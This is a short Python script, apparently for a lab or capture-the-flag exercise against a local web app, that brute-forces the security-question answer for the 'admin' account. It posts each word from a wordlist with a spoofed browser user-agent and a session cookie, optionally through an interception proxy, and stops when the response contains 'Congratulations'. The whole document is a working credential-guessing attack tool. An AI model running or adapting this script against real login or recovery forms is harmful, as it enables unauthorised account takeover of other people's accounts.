import requests 
import re
import sys

wordlist = "answers.txt"
host = "http://127.0.0.1:8000"
path = "/Foo/Bar/questions"
url = host + path

headers = { 
  "User-agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0", 
  "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"
}

cookies = dict(JSESSIONID="y_L2ZR0yUe5Or8cfQVa88Z8JP4NP_XK9GmGzN9D8",cookie2="value2",cookie3="value3")

proxyDict = { 
  "http"  : "http://127.0.0.1:8080", 
  "https" : "http://127.0.0.1:8080", 
  "ftp"   : "http://127.0.0.1:8080"
}

lines = open(wordlist)
for line in lines:

  # Strips the newline character 
  word = line.strip()

  PARAMS = {'username':'admin','securityQuestion':word}

  # With Proxy
  #r = requests.post(url = URL, params = PARAMS, headers=headers, cookies=cookies,proxies=proxyDict)

  # Without Proxy
  r = requests.post(url = url, params = PARAMS, headers=headers, cookies=cookies)

  data = r.text
  #print(data)

  if "Congratulations" in data:
    print("[+] MATCH! Found: {}".format(word))
    sys.exit(0)

print("[-] NO MATCH")
